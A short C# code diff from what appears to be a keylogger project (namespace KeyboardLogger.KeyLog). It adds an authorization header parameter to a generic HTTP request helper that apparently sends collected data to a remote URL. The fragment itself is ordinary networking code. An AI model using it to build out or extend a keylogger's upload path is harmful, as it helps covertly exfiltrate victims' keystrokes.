@@ -14,7 +14,7 @@ namespace KeyboardLogger.KeyLog
     {
         // Request (url, method, contentType, msg)
         // - perform a http request to given url and get a response
-        public static string Request(string url, string method, string contentType, string msg)
+        public static string Request(string url, string method, string contentType, string auth, string msg)
         {
             HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
             ASCIIEncoding encd = new ASCIIEncoding();
@@ -22,6 +22,7 @@ namespace KeyboardLogger.KeyLog
             req.Method = method;
             req.ContentType = contentType;
             req.ContentLength = data.Length;
+            req.Headers.Add("Authorization", auth);
             using (Stream reqStrm = req.GetRequestStream()) { reqStrm.Write(data, 0, data.Length); }
             HttpWebResponse res = (HttpWebResponse)req.GetResponse();
             string resStr = new StreamReader(res.GetResponseStream()).ReadToEnd();
